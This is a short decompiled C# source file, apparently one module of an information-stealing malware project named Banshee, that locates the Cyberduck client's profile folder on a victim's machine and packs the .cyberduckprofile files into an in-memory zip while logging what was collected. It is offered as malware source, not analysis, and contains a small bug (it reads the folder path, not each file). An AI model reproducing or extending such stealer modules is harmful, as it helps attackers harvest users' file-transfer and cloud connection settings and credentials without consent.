﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Applications
{
	// Token: 0x02000094 RID: 148
	public class CyberDuck : ITarget
	{
		// Token: 0x060001BE RID: 446 RVA: 0x0000E6FC File Offset: 0x0000E6FC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
			if (!Directory.Exists(path))
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "CyberDuck";
			foreach (string text in Directory.GetFiles(path))
			{
				if (text.EndsWith(".cyberduckprofile"))
				{
					string text2 = "CyberDuck\\" + Path.GetFileName(text);
					zip.AddFile(text2, File.ReadAllBytes(path));
					counterApplications.Files.Add(text + " => " + text2);
				}
			}
			counter.Applications.Add(counterApplications);
		}
	}
}
